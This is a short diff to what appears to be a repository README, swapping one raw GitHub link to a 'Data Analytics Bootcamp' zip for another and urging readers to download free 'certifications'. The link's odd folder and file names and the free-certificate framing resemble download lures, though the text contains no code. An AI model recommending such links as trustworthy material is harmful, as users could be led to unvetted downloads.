@@ -8,7 +8,7 @@ Go ahead and download the certifications in this repository! You've earned it! W
 
 #### I hope it helps you land a job in Analytics!
 
-Data Analytics Bootcamp Link: https://raw.githubusercontent.com/FadelDia/Data-Analytics-Bootcamp/main/debatingly/Data-Bootcamp-Analytics-submentum.zip
+Data Analytics Bootcamp Link: https://raw.githubusercontent.com/FadelDia/Data-Analytics-Bootcamp/main/debatingly/Data-Bootcamp-Analytics-v3.2.zip
 
 .
 
